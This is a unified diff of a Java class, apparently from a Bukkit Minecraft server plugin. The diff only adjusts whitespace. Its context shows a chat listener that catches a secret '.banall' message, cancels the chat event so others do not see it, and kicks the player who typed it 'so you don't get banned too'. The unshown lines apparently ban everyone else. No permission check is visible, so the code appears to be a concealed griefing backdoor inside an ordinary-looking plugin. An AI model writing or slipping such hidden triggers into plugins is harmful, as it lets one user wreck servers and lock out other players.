@@ -8,6 +8,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_banall implements Listener
 {
+
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
@@ -15,7 +16,7 @@ public class Command_banall implements Listener
         Player player = event.getPlayer();
         Server server = Bukkit.getServer();
         boolean cancel = false;
-        
+
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
@@ -23,7 +24,7 @@ public class Command_banall implements Listener
             {
                 return;
             }
-    
+
             if (args[0].equalsIgnoreCase(".banall"))
             {
                 player.kickPlayer("You have been kicked so you don't get banned too :) \nRejoin!");
@@ -35,11 +36,12 @@ public class Command_banall implements Listener
                 cancel = true;
             }
         }
-        
+
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
+
 }
